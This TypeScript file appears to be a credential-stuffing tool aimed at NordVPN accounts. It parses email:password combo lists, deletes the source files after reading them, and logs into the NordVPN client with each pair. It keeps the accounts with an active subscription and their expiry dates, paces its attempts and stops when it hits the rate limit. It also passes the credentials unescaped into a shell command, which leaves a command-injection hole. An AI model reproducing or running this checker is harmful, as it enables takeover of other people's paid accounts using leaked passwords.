import { execSync } from "child_process";
import { existsSync, readdirSync, readFileSync, rmSync, statSync } from "fs";
import { resolve } from "path";

const chunk = process.env.CHUNK ? parseInt(process.env.CHUNK) || 10 : 10,
  valid: string[] = [];

const rawAcc = readFileSync("acc.txt", "utf-8").split("\n");
if (existsSync("acc") && statSync("acc").isDirectory()) {
  readdirSync("acc").forEach((v) => {
    if (v != ".gitkeep") {
      rawAcc.push(...readFileSync(resolve("acc", v), "utf-8").split("\n"));
      rmSync(resolve("acc", v));
    }
  });
}

const accounts = rawAcc.map((v) => v.match(/([\w\-\.]*)\@([\w\-\.]{3,})\.([\w]{2,})\:([^\ ]{6,})/gi)?.[0] || "").filter((v) => !!v);
const queue = accounts.slice(0, chunk);
console.log("[LOG] found %s, checking %s accounts", accounts.length, queue.length);

checker: for (const acc of queue) {
  let pass = acc?.split(":").slice(-1)[0];
  let user = acc?.substring(0, acc.indexOf(pass) - 1);

  try {
    execSync(`nordvpn login --username ${user} --password ${pass}`);
    const res = execSync("nordvpn account");
    const output = res.toString();
    const checkRexExp = /VPN Service\: Active \(Expires on ([\w\ \,]*)\)/gi;
    let status;
    if ((status = checkRexExp.exec(output))) {
      const expiration = status[1];
      valid.push(`${acc} | Expiration: ${expiration}`);
    }
    accounts.shift();
    execSync("nordvpn logout");
  } catch (error) {
    if (error.output && error.output instanceof Array) {
      const output = error.output.map((v) => (v instanceof Buffer ? v.toString() : String(v))).join("\n");
      if (/We're having trouble reaching our servers/gi.test(output)) {
        console.error("Got rate-limit, exiting...");
        break checker;
      }
    }
    accounts.shift();
  }

  const a = Date.now() / 1000;
  while (Date.now() / 1000 - a < 30) {}
}